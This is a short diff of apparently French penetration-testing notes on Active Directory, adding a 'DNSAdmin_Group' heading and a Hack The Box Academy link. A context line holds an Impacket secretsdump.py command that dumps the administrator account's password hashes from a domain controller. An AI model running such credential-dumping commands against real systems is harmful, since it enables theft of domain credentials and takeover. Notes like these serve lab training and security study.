@@ -37,3 +37,5 @@ Confirmer les accès au DC
 Récuperer les hashes 
 	--> secretsdump.py <user_name>@<dc_ip> -just-dc-user administrator
 
+#DNSAdmin_Group 
+https://academy.hackthebox.com/module/67/section/603
